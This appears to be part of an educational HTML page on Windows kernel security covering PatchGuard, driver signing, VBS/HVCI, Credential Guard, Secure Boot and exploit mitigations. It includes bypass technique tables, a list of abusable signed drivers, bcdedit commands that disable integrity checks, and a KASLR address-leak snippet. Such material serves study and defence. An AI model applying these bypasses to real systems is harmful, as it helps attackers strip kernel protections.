@@ -1,0 +1,1835 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Windows Kernel Security</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+  <h1>Windows Kernel Security</h1>
+
+  <ul class="nav nav-tabs" id="mainTab" role="tablist">
+    <li class="nav-item" role="presentation">
+      <button class="nav-link active" id="notes-tab" data-bs-toggle="tab" data-bs-target="#notes" type="button" role="tab" aria-controls="notes" aria-selected="true">Notes</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="lab-tab" data-bs-toggle="tab" data-bs-target="#lab" type="button" role="tab" aria-controls="lab" aria-selected="false">Labs</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="ctf-tab" data-bs-toggle="tab" data-bs-target="#ctf" type="button" role="tab" aria-controls="ctf" aria-selected="false">CTF Challenges</button>
+    </li>
+  </ul>
+
+  <div class="tab-content" id="mainTabContent">
+
+    <!-- ============================================================ -->
+    <!-- NOTES TAB -->
+    <!-- ============================================================ -->
+    <div class="tab-pane fade show active" id="notes" role="tabpanel" aria-labelledby="notes-tab">
+
+      <!-- ===================== KERNEL PATCH PROTECTION ===================== -->
+      <h2>Kernel Patch Protection (PatchGuard / KPP)</h2>
+
+      <h3>What PatchGuard Protects</h3>
+      <p>PatchGuard monitors the integrity of critical kernel structures. If modification is detected, it issues a <code>CRITICAL_STRUCTURE_CORRUPTION</code> (0x109) bugcheck.</p>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Structure</th><th>Description</th><th>Why Attackers Target It</th></tr></thead>
+        <tbody>
+          <tr><td>SSDT (System Service Descriptor Table)</td><td>Maps syscall numbers → kernel function pointers</td><td>Hook syscalls to intercept/redirect all user-mode API calls</td></tr>
+          <tr><td>IDT (Interrupt Descriptor Table)</td><td>Maps interrupt vectors → ISR handlers</td><td>Hook interrupts (int 0x2E, NMI) for stealth execution</td></tr>
+          <tr><td>GDT (Global Descriptor Table)</td><td>Segment descriptors, TSS entries</td><td>Create call gates for ring3→ring0 transitions</td></tr>
+          <tr><td>MSRs (Model Specific Registers)</td><td>LSTAR (syscall handler), EFER, IA32_SYSENTER_EIP</td><td>Redirect syscall entry point to attacker code</td></tr>
+          <tr><td>Kernel code sections (.text)</td><td>ntoskrnl.exe, hal.dll code pages</td><td>Inline-hook kernel functions</td></tr>
+          <tr><td>Processor control structures</td><td>KPCR, KPRCB, KTHREAD critical fields</td><td>Manipulate scheduler, process lists</td></tr>
+          <tr><td>Kernel image mapping</td><td>PE headers, section alignment</td><td>Map rogue code into kernel space</td></tr>
+          <tr><td>Debug routines</td><td>KdDebuggerEnabled, KdpStub</td><td>Enable kernel debugging on production systems</td></tr>
+        </tbody>
+      </table>
+
+      <h3>How PatchGuard Works Internally</h3>
+      <ul>
+        <li><strong>Initialization:</strong> During boot, KPP creates an encrypted "protection context" stored in a randomized pool allocation. The context contains checksums of all monitored structures.</li>
+        <li><strong>Timer mechanism:</strong> Uses DPC (Deferred Procedure Call) timers with randomized intervals (5–10 minutes). The timer callback is obfuscated — it's not a simple function pointer.</li>
+        <li><strong>Encrypted context:</strong> The verification context is encrypted with a key derived from system state. Each check decrypts the context, validates structures, re-encrypts with a new key.</li>
+        <li><strong>Multiple entry points:</strong> PatchGuard code is dispersed throughout ntoskrnl.exe. It's triggered from multiple code paths (DPC callbacks, workitems, exception handlers, APC routines) making it impossible to hook a single function.</li>
+        <li><strong>Self-protection:</strong> PatchGuard monitors its own timer objects. If a timer is cancelled, it triggers the bugcheck from an alternate path.</li>
+        <li><strong>Obfuscation:</strong> Heavy use of code obfuscation (opaque predicates, control flow flattening) in the verification routines to resist static analysis.</li>
+      </ul>
+
+      <h3>Known Bypass Techniques</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Technique</th><th>Mechanism</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Exception handler manipulation</strong></td><td>Corrupt KPP's encrypted context so that when decrypted, it causes an exception. Register a custom exception handler that silences the check.</td><td>Patched in later Windows versions; context now validated before use</td></tr>
+          <tr><td><strong>Timer manipulation (DPC cancel)</strong></td><td>Locate the KPP DPC timer in pool memory via signature scanning. Cancel the timer or modify its DueTime to max value.</td><td>PatchGuard now uses multiple redundant timers and self-monitors timer state</td></tr>
+          <tr><td><strong>Hypervisor-based (GhostHook)</strong></td><td>Use Intel PT (Processor Trace) to set a ToPA buffer boundary that triggers a PMI when KPP code executes. The PMI handler redirects execution.</td><td>Works on systems without VBS. HVCI blocks this approach.</td></tr>
+          <tr><td><strong>KPP context corruption + NMI</strong></td><td>Trigger NMI during PatchGuard validation. In the NMI handler, fixup the structure being checked.</td><td>Race condition; unreliable</td></tr>
+          <tr><td><strong>InfinityHook</strong></td><td>Hook ETW's EtwpGetCycleCount pointer inside WMI_LOGGER_CONTEXT. PatchGuard calls ETW internally, so this gives execution before validation completes.</td><td>Patched in Windows 10 20H1+</td></tr>
+          <tr><td><strong>ByePg</strong></td><td>Locate PatchGuard DPC routine via heuristic scanning, replace with a stub that returns without checking.</td><td>Requires finding context; increasingly obfuscated</td></tr>
+        </tbody>
+      </table>
+
+      <h3>PatchGuard and Secure Kernel</h3>
+      <p>On VBS-enabled systems, PatchGuard's integrity verification is reinforced by the Secure Kernel (VTL 1). The Secure Kernel holds a copy of the protected structures' hashes. Even if PatchGuard is bypassed at VTL 0, the Secure Kernel independently detects tampering via Second Level Address Translation (SLAT) page fault interception. This makes VBS + PatchGuard significantly harder to defeat than PatchGuard alone.</p>
+
+      <!-- ===================== DRIVER SIGNING & KMCS ===================== -->
+      <h2>Driver Signing & Kernel Mode Code Signing (KMCS)</h2>
+
+      <h3>64-bit Enforcement</h3>
+      <ul>
+        <li>Since Windows Vista x64, ALL kernel-mode code must be digitally signed. No exceptions (outside test-signing mode).</li>
+        <li>The <code>ci.dll</code> (Code Integrity) module validates signatures at load time.</li>
+        <li>DSE state tracked by the global variable <code>ci!g_CiOptions</code>:
+          <ul>
+            <li><code>0x0</code> = Disabled (no enforcement)</li>
+            <li><code>0x6</code> = Enabled (default)</li>
+            <li><code>0x8</code> = Enabled + UMCI (User-Mode Code Integrity)</li>
+          </ul>
+        </li>
+      </ul>
+
+      <h3>Certificate Requirements Timeline</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Period</th><th>Requirement</th></tr></thead>
+        <tbody>
+          <tr><td>Pre-2015</td><td>Any code-signing certificate from a trusted CA (cross-signed with Microsoft root)</td></tr>
+          <tr><td>2015-2021</td><td>Cross-signed certificates accepted; EV code-signing recommended for attestation signing via Partner Center</td></tr>
+          <tr><td>Post July 2021</td><td><strong>Cross-signing deprecated.</strong> New kernel drivers MUST be submitted to Microsoft Partner Center (formerly WHQL/attestation signing). Microsoft signs the driver with their root certificate.</td></tr>
+          <tr><td>Exception</td><td>Drivers signed before July 29, 2015 with a non-revoked cross-signed certificate still load (grandfather clause)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>WHQL Certification</h3>
+      <p>Windows Hardware Quality Labs (WHQL) testing validates driver stability. After passing HLK tests, Microsoft signs the driver package. Drivers with WHQL signatures get preferential treatment during Windows Update and Secure Boot enforcement.</p>
+
+      <h3>BYOVD (Bring Your Own Vulnerable Driver)</h3>
+      <p>Attackers load a legitimately signed but vulnerable driver to gain kernel read/write/execute primitives. Since the driver has a valid Microsoft/WHQL signature, it passes DSE checks.</p>
+
+      <h4>Well-Known Vulnerable Drivers</h4>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Driver</th><th>Product</th><th>Capabilities</th><th>Used By</th></tr></thead>
+        <tbody>
+          <tr><td><code>RTCore64.sys</code></td><td>MSI Afterburner</td><td>Arbitrary physical memory R/W, MSR R/W, port I/O</td><td>RobinHood ransomware, multiple APTs</td></tr>
+          <tr><td><code>dbutil_2_3.sys</code></td><td>Dell BIOS Utility</td><td>Arbitrary kernel memory R/W via IOCTLs</td><td>CVE-2021-21551; privilege escalation</td></tr>
+          <tr><td><code>iqvw64e.sys</code></td><td>Intel Network Adapter Diagnostic</td><td>Physical memory mapping, arbitrary R/W</td><td>Lazarus Group, multiple toolkits</td></tr>
+          <tr><td><code>AsIO64.sys</code></td><td>ASUS utilities</td><td>Physical memory R/W, port I/O</td><td>Various malware loaders</td></tr>
+          <tr><td><code>gdrv.sys</code></td><td>GIGABYTE utilities</td><td>Arbitrary kernel R/W</td><td>EfiGuard, custom rootkits</td></tr>
+          <tr><td><code>PROCEXP152.sys</code></td><td>Process Explorer (Sysinternals)</td><td>Kill arbitrary processes (PPL bypass)</td><td>AuKill, Backstab tools</td></tr>
+          <tr><td><code>WinRing0x64.sys</code></td><td>Various hardware monitors</td><td>MSR R/W, physical memory, port I/O</td><td>Cryptominers, rootkits</td></tr>
+          <tr><td><code>HW64.sys</code></td><td>HWiNFO</td><td>Physical memory R/W, port I/O</td><td>Various attack tools</td></tr>
+        </tbody>
+      </table>
+
+      <h3>DSE (Driver Signature Enforcement) Bypass Techniques</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Method</th><th>Description</th><th>Requirements</th></tr></thead>
+        <tbody>
+          <tr><td>Overwrite <code>ci!g_CiOptions</code></td><td>Use a vulnerable driver's arbitrary write to set g_CiOptions = 0</td><td>Admin + vulnerable signed driver loaded</td></tr>
+          <tr><td>Test-signing mode</td><td><code>bcdedit /set testsigning on</code></td><td>Admin + reboot; shows watermark; blocked by Secure Boot</td></tr>
+          <tr><td>Boot configuration</td><td><code>bcdedit /set nointegritychecks on</code></td><td>Admin + reboot; blocked by Secure Boot</td></tr>
+          <tr><td>CI callback manipulation</td><td>Modify CI.dll's SiPolicy callbacks or CiValidateImageHeader return</td><td>Kernel R/W primitive</td></tr>
+          <tr><td>Timestomping</td><td>Set driver file timestamp to before July 29, 2015 to exploit grandfather clause (Windows checks signing date, not file date — partially mitigated)</td><td>Revoked in recent builds</td></tr>
+          <tr><td>HvlpBelow1MBRecovery exploit</td><td>Abuse certain hypervisor recovery paths that skip CI checks</td><td>Very specific conditions</td></tr>
+        </tbody>
+      </table>
+
+      <!-- ===================== VBS ===================== -->
+      <h2>Virtualization-Based Security (VBS)</h2>
+
+      <h3>Architecture Overview</h3>
+      <p>VBS uses the Windows Hypervisor to create isolated virtual trust levels (VTLs). The hypervisor runs at the highest privilege and mediates all memory access via SLAT (Second Level Address Translation / Extended Page Tables).</p>
+
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Component</th><th>VTL 0 (Normal World)</th><th>VTL 1 (Secure World)</th></tr></thead>
+        <tbody>
+          <tr><td>Kernel</td><td>ntoskrnl.exe (Windows kernel)</td><td>securekernel.exe (Secure Kernel)</td></tr>
+          <tr><td>User-mode</td><td>Normal processes</td><td>Trustlets (IUM processes): LsaIso.exe, etc.</td></tr>
+          <tr><td>Memory access</td><td>Cannot see/modify VTL 1 memory</td><td>Can see VTL 0 memory (for services), but isolated own pages</td></tr>
+          <tr><td>Privilege</td><td>Ring 0 of VTL 0 < Ring 3 of VTL 1 (in terms of memory isolation)</td><td>Protected by hypervisor EPT permissions</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Hypervisor Role</h3>
+      <ul>
+        <li>Runs as a Type-1 hypervisor (bare-metal) below both VTLs</li>
+        <li>Manages EPT/SLAT tables: assigns per-VTL page permissions (Read/Write/Execute per VTL)</li>
+        <li>Intercepts sensitive operations (VMCALL, MSR access, CR writes) from VTL 0</li>
+        <li>Provides hypercall interface for VTL transitions (VTL call/return)</li>
+        <li>Enforces W^X on kernel memory (pages cannot be both Writable and Executable simultaneously)</li>
+      </ul>
+
+      <h3>HVCI (Hypervisor-Protected Code Integrity)</h3>
+      <p>HVCI enforces code integrity at the hypervisor level. Even kernel-mode code at VTL 0 cannot execute unsigned code because the hypervisor controls page table permissions.</p>
+      <ul>
+        <li><strong>Mechanism:</strong> Before any kernel page is marked executable in VTL 0's page tables, the Secure Kernel (VTL 1) must validate the code's signature. The hypervisor prevents VTL 0 from directly modifying its own page table execute bits.</li>
+        <li><strong>Effect:</strong> No allocation of RWX kernel memory. NX pool allocations enforced. Runtime kernel code generation blocked.</li>
+        <li><strong>Blocks:</strong> BYOVD shellcode injection, pool spray with executable code, unsigned driver loading even after DSE bypass of ci!g_CiOptions</li>
+        <li><strong>Limitations:</strong> Doesn't prevent data-only attacks (corrupting function pointers to existing signed code = code reuse attacks)</li>
+      </ul>
+
+      <h3>Memory/Register Protection Between VTLs</h3>
+      <ul>
+        <li><strong>EPT isolation:</strong> VTL 1 memory pages have VTL 0 EPT entries set to no-read/no-write/no-execute. Hardware-enforced.</li>
+        <li><strong>Register state:</strong> On VTL transition, the hypervisor saves/restores register state. VTL 0 cannot read VTL 1's register contents.</li>
+        <li><strong>Interrupt isolation:</strong> VTL 1 can mask interrupts during sensitive operations; VTL 0 cannot inject interrupts into VTL 1.</li>
+        <li><strong>DMA protection:</strong> IOMMU (VT-d) prevents DMA devices from accessing VTL 1 memory.</li>
+      </ul>
+
+      <h3>VBS Requirements</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Requirement</th><th>Detail</th></tr></thead>
+        <tbody>
+          <tr><td>CPU Virtualization</td><td>Intel VT-x or AMD-V with SLAT (EPT/RVI)</td></tr>
+          <tr><td>IOMMU</td><td>Intel VT-d or AMD-Vi (DMA remapping)</td></tr>
+          <tr><td>UEFI Secure Boot</td><td>Firmware must support UEFI 2.3.1+ with Secure Boot</td></tr>
+          <tr><td>TPM (recommended)</td><td>TPM 2.0 for measured boot attestation</td></tr>
+          <tr><td>64-bit OS</td><td>VBS not available on 32-bit Windows</td></tr>
+          <tr><td>Compatible drivers</td><td>All loaded drivers must be HVCI-compatible (no RWX sections, no dynamic code mapping)</td></tr>
+        </tbody>
+      </table>
+
+<pre><code class="language-powershell"># Check VBS status
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+
+# Enable VBS via registry
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 3  # 1=SecureBoot, 3=SecureBoot+DMA
+
+# Enable HVCI
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1
+
+# Check running status
+(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).VirtualizationBasedSecurityStatus
+# 0 = Not enabled, 1 = Enabled but not running, 2 = Running</code></pre>
+
+      <!-- ===================== CREDENTIAL GUARD ===================== -->
+      <h2>Credential Guard</h2>
+
+      <h3>Architecture</h3>
+      <p>Credential Guard runs the LSA (Local Security Authority) secrets inside an isolated VTL 1 trustlet process: <code>LsaIso.exe</code> (LSA Isolated). The normal <code>lsass.exe</code> at VTL 0 communicates with LsaIso via secure RPC but never has direct access to the credential material.</p>
+
+      <h3>What IS Protected</h3>
+      <ul>
+        <li>NTLM password hashes (derived credentials)</li>
+        <li>Kerberos TGT (Ticket Granting Tickets)</li>
+        <li>Kerberos session keys</li>
+        <li>Domain-derived credentials (DPAPI domain backup key protection)</li>
+      </ul>
+
+      <h3>What is NOT Protected</h3>
+      <ul>
+        <li>Local account password hashes (stored in SAM, not domain creds)</li>
+        <li>Service account passwords (stored in LSA secrets in registry)</li>
+        <li>Cached domain logon data (DCC2 hashes in SECURITY hive)</li>
+        <li>Machine account password (SECURITY hive)</li>
+        <li>Credentials for non-domain protocols (WDigest if enabled, CredSSP)</li>
+        <li>Application-specific credentials (browser passwords, etc.)</li>
+      </ul>
+
+      <h3>Attack Surface Reduction</h3>
+      <ul>
+        <li><strong>Mimikatz <code>sekurlsa::logonpasswords</code>:</strong> Returns encrypted blobs instead of plaintext/hashes for protected credentials</li>
+        <li><strong>Pass-the-Hash:</strong> NTLM hash stored in VTL 1; cannot be extracted by VTL 0 kernel-mode code</li>
+        <li><strong>Memory dump of lsass.exe:</strong> Only contains proxy handles, not actual secrets</li>
+      </ul>
+
+      <h3>Bypass Attempts</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Vector</th><th>Feasibility</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td>Compromise VTL 1 Secure Kernel</td><td>Extremely difficult</td><td>Requires hypervisor escape or VTL 1 code execution (no public exploits)</td></tr>
+          <tr><td>Downgrade attack (disable Credential Guard)</td><td>Requires reboot + admin</td><td>After reboot without CG, cached creds may be in lsass again on next logon</td></tr>
+          <tr><td>Kerberos relay/delegation abuse</td><td>Feasible</td><td>CG doesn't prevent protocol-level attacks (unconstrained delegation, S4U)</td></tr>
+          <tr><td>Silver/Golden tickets</td><td>Feasible if key material obtained from DC</td><td>CG protects client-side creds; DC compromise is still game-over</td></tr>
+          <tr><td>DMA attack on VTL 1</td><td>Blocked by IOMMU</td><td>If VT-d not configured, theoretically possible</td></tr>
+        </tbody>
+      </table>
+
+<pre><code class="language-powershell"># Check Credential Guard status
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | 
+  Select-Object -ExpandProperty SecurityServicesRunning
+# 1 = Credential Guard, 2 = HVCI
+
+# Verify LsaIso.exe is running (indicates Credential Guard active)
+Get-Process -Name LsaIso -ErrorAction SilentlyContinue
+
+# Enable Credential Guard
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 1
+# 1 = Enabled with UEFI lock, 2 = Enabled without lock</code></pre>
+
+      <!-- ===================== SECURE BOOT & UEFI ===================== -->
+      <h2>Secure Boot & UEFI</h2>
+
+      <h3>Boot Chain</h3>
+      <p>Each stage verifies the next before handing off execution:</p>
+      <ol>
+        <li><strong>UEFI Firmware (SEC/PEI/DXE):</strong> Platform initialization; loads Secure Boot keys from NVRAM</li>
+        <li><strong>Boot Manager (bootmgfw.efi):</strong> Verified against db; selects boot entry</li>
+        <li><strong>Windows Boot Loader (winload.efi):</strong> Loads kernel, HAL, boot-start drivers; verifies their signatures</li>
+        <li><strong>Kernel (ntoskrnl.exe):</strong> Initializes system, loads remaining drivers</li>
+        <li><strong>ELAM Driver:</strong> First third-party driver to load; can classify subsequent boot-start drivers</li>
+        <li><strong>Boot-start Drivers:</strong> Loaded in dependency order; classified by ELAM as Good/Bad/Unknown</li>
+      </ol>
+
+      <h3>Secure Boot Key Hierarchy</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Key/Database</th><th>Purpose</th><th>Who Controls It</th></tr></thead>
+        <tbody>
+          <tr><td><strong>PK (Platform Key)</strong></td><td>Root of trust; can modify KEK. Only one PK.</td><td>OEM (hardware manufacturer)</td></tr>
+          <tr><td><strong>KEK (Key Exchange Key)</strong></td><td>Can modify db/dbx without PK. Multiple allowed.</td><td>OEM + OS vendor (Microsoft)</td></tr>
+          <tr><td><strong>db (Signature Database)</strong></td><td>Whitelist: trusted certificates/hashes for allowed EFI binaries</td><td>Managed by KEK holders</td></tr>
+          <tr><td><strong>dbx (Forbidden Signature Database)</strong></td><td>Blacklist: revoked certificates/hashes</td><td>Updated via Windows Update + KEK</td></tr>
+          <tr><td><strong>Microsoft UEFI CA</strong></td><td>Certificate in db that signs all Windows boot components + WHQL UEFI drivers</td><td>Microsoft</td></tr>
+          <tr><td><strong>Microsoft 3rd-party CA</strong></td><td>Signs third-party UEFI binaries (shim for Linux, option ROMs)</td><td>Microsoft</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Measured Boot & TPM</h3>
+      <ul>
+        <li><strong>PCR 0-7:</strong> Firmware measurements (code, configuration, Secure Boot state)</li>
+        <li><strong>PCR 8-15:</strong> OS boot measurements (boot manager, boot loader, boot drivers)</li>
+        <li><strong>Boot Attestation:</strong> Remote attestation service can verify PCR values against expected-good measurements (health attestation)</li>
+        <li><strong>BitLocker:</strong> Seals volume encryption key to specific PCR values → changing boot chain breaks decryption</li>
+      </ul>
+
+      <h3>Early Launch Anti-Malware (ELAM)</h3>
+      <ul>
+        <li>Loaded before any third-party boot-start drivers</li>
+        <li>Receives callbacks for each subsequent boot-start driver load</li>
+        <li>Classifies drivers: Known Good, Known Bad, Unknown</li>
+        <li>Policy determines action: Load All, Load Good+Unknown, Load Good Only</li>
+        <li>ELAM drivers must be signed by Microsoft (special ELAM certificate)</li>
+        <li>Limited functionality: small, no runtime deps, measurement-based only</li>
+      </ul>
+
+      <h3>Bootkit Attacks & BlackLotus (CVE-2023-24932)</h3>
+      <p>BlackLotus was the first in-the-wild UEFI bootkit to bypass Secure Boot on fully patched Windows 11 systems:</p>
+      <ul>
+        <li><strong>Vulnerability:</strong> Exploited a Secure Boot bypass (CVE-2022-21894 / "Baton Drop") — a signed Windows boot application with a logic flaw that allowed loading arbitrary code</li>
+        <li><strong>Mechanism:</strong> Used a legitimately signed but vulnerable <code>bootmgfw.efi</code> to chain into attacker code before the kernel loads</li>
+        <li><strong>Persistence:</strong> Modifies EFI System Partition; survives OS reinstall</li>
+        <li><strong>Capabilities:</strong> Disables BitLocker, HVCI, Windows Defender; loads unsigned kernel drivers</li>
+        <li><strong>Fix complexity:</strong> Requires dbx update to revoke old bootloaders; Microsoft rolled out fix in phases due to risk of bricking systems</li>
+      </ul>
+
+<pre><code class="language-powershell"># Check Secure Boot status
+Confirm-SecureBootUEFI
+# Returns True/False
+
+# View Secure Boot policy
+Get-SecureBootPolicy
+
+# List UEFI variables (requires admin)
+Get-SecureBootUEFI -Name PK    # Platform Key
+Get-SecureBootUEFI -Name KEK   # Key Exchange Keys
+Get-SecureBootUEFI -Name db    # Allowed signatures
+Get-SecureBootUEFI -Name dbx   # Revoked signatures
+
+# Check BCD for integrity settings
+bcdedit /enum {bootmgr}
+# Look for: path \EFI\Microsoft\Boot\bootmgfw.efi
+# integrityservices = Enable
+
+# Check ELAM driver
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy"
+# 1=Good only, 3=Good+Unknown(default), 7=All, 8=OS default</code></pre>
+
+      <!-- ===================== KERNEL EXPLOIT MITIGATIONS ===================== -->
+      <h2>Kernel Exploit Mitigations</h2>
+
+      <h3>KASLR (Kernel Address Space Layout Randomization)</h3>
+      <ul>
+        <li><strong>Mechanism:</strong> Kernel image base randomized from ~256 possible positions (8 bits entropy) at each boot</li>
+        <li><strong>Applies to:</strong> ntoskrnl.exe, hal.dll, kernel drivers, kernel pool base addresses</li>
+        <li><strong>Weakness:</strong> Low entropy compared to user-mode ASLR (only position within ~16MB range)</li>
+        <li><strong>Information leaks via <code>NtQuerySystemInformation</code>:</strong>
+          <ul>
+            <li><code>SystemModuleInformation</code> (class 11): Returns base addresses of all loaded kernel modules — available from Medium IL prior to mitigation</li>
+            <li><code>SystemBigPoolInformation</code> (class 66): Pool allocation addresses + tags</li>
+            <li><code>SystemHandleInformation</code> (class 16): Kernel object addresses</li>
+            <li>Mitigated in recent builds: requires admin or medium+ IL with specific process flags</li>
+          </ul>
+        </li>
+      </ul>
+
+<pre><code class="language-c">// Classic KASLR leak (requires elevation on modern Windows)
+NTSTATUS status;
+ULONG returnLength;
+PSYSTEM_MODULE_INFORMATION pModInfo;
+
+NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &returnLength);
+pModInfo = (PSYSTEM_MODULE_INFORMATION)malloc(returnLength);
+status = NtQuerySystemInformation(SystemModuleInformation, pModInfo, returnLength, &returnLength);
+
+// pModInfo->Modules[0].ImageBase == ntoskrnl.exe base address
+printf("ntoskrnl base: 0x%p\n", pModInfo->Modules[0].ImageBase);</code></pre>
+
+      <h3>SMEP (Supervisor Mode Execution Prevention)</h3>
+      <ul>
+        <li><strong>CPU feature:</strong> CR4.SMEP (bit 20); supported since Intel Ivy Bridge / AMD Zen</li>
+        <li><strong>Effect:</strong> If CPL=0 (ring 0) attempts to fetch instructions from a user-mode page (U/S bit set in PTE), generates #PF</li>
+        <li><strong>Bypass techniques:</strong>
+          <ul>
+            <li>Flip CR4.SMEP bit (requires arbitrary MSR write or ROP gadget: <code>mov cr4, rxx; ret</code>)</li>
+            <li>Remap shellcode in kernel space (flip U/S bit in PTE for target page)</li>
+            <li>ROP chain using only kernel-mode gadgets (don't execute user pages)</li>
+            <li>Use kernel pool spray to get executable code into kernel pages</li>
+          </ul>
+        </li>
+      </ul>
+
+      <h3>SMAP (Supervisor Mode Access Prevention)</h3>
+      <ul>
+        <li><strong>CPU feature:</strong> CR4.SMAP (bit 21); supported since Intel Broadwell / AMD Zen</li>
+        <li><strong>Effect:</strong> Ring 0 cannot read/write user-mode pages unless EFLAGS.AC is set (via STAC/CLAC instructions)</li>
+        <li><strong>Significance:</strong> Prevents kernel from being tricked into using attacker-controlled user-space data structures</li>
+        <li><strong>Bypass:</strong> ROP gadget with STAC; or flip CR4.SMAP; or only use kernel-space data</li>
+        <li><strong>Windows adoption:</strong> Enforced since Windows 10 1607+</li>
+      </ul>
+
+      <h3>CFG / kCFG / XFG</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Technology</th><th>Scope</th><th>Mechanism</th><th>Bypass</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>CFG</strong> (Control Flow Guard)</td>
+            <td>User-mode (since Win 8.1 Update 3)</td>
+            <td>Bitmap at fixed VA; before indirect call, checks if target is valid function start</td>
+            <td>Call any valid function entry (not fine-grained); JIT spray; corrupt bitmap</td>
+          </tr>
+          <tr>
+            <td><strong>kCFG</strong> (Kernel CFG)</td>
+            <td>Kernel-mode (since Win 10 1703)</td>
+            <td>Same bitmap approach but for kernel function pointers; bitmap protected by VBS/HVCI</td>
+            <td>Data-only attacks; call valid kernel functions in unintended order; target exported functions</td>
+          </tr>
+          <tr>
+            <td><strong>XFG</strong> (eXtended Flow Guard)</td>
+            <td>Kernel + User (Win 10 20H1+)</td>
+            <td>Type-based: function prototype hash stored before function entry; indirect call validates hash matches expected signature</td>
+            <td>Find function with matching type signature; type confusion in hash comparison</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h3>CET (Control-flow Enforcement Technology)</h3>
+      <ul>
+        <li><strong>Shadow Stack:</strong> Hardware-maintained return address stack. On RET, compares return address against shadow stack value. Mismatch → #CP exception.</li>
+        <li><strong>IBT (Indirect Branch Tracking):</strong> Indirect JMP/CALL must land on an <code>ENDBRANCH</code> instruction. Landing elsewhere → #CP.</li>
+        <li><strong>Kernel CET:</strong> Enabled in Windows 11+ kernels. Shadow stack pages marked with a special PTE bit, non-writable by normal stores.</li>
+        <li><strong>Bypass difficulty:</strong> Must corrupt shadow stack (requires physical memory access or hypervisor-level primitive); or use gadgets that end at ENDBRANCH (very limited).</li>
+      </ul>
+
+      <h3>Kernel Pool Hardening</h3>
+      <ul>
+        <li><strong>Safe unlinking:</strong> Validates forward/backward pointers before unlinking from free list (prevents classic unlink exploitation)</li>
+        <li><strong>Pool cookies:</strong> Random canary values in pool headers; validated on free</li>
+        <li><strong>NonPagedPoolNx:</strong> Default non-paged pool is non-executable (since Win 8). Must use <code>ExAllocatePool2</code> with explicit <code>POOL_FLAG_NON_PAGED_EXECUTE</code> for executable pool.</li>
+        <li><strong>Pool quota hardening:</strong> Quota pointer validation prevents arbitrary decrement primitives</li>
+        <li><strong>Segment Heap (kernel):</strong> Windows 10 20H1+ uses segment heap in kernel. Different allocation patterns, metadata layout, makes traditional pool spray harder.</li>
+      </ul>
+
+      <h3>KVAS (Kernel Virtual Address Shadow) — Meltdown Mitigation</h3>
+      <ul>
+        <li><strong>Problem:</strong> Meltdown (CVE-2017-5754) allows user-mode to read kernel memory via speculative execution side-channel</li>
+        <li><strong>Solution:</strong> Two sets of page tables — user page tables don't map kernel memory (except minimal trampoline). On syscall entry, switch to kernel page tables; on return, switch back.</li>
+        <li><strong>Performance:</strong> ~5-30% overhead on syscall-heavy workloads (TLB flush on context switch)</li>
+        <li><strong>Modern CPUs:</strong> Not needed on CPUs with hardware fix (Intel Ice Lake+, AMD Zen 2+ not affected)</li>
+      </ul>
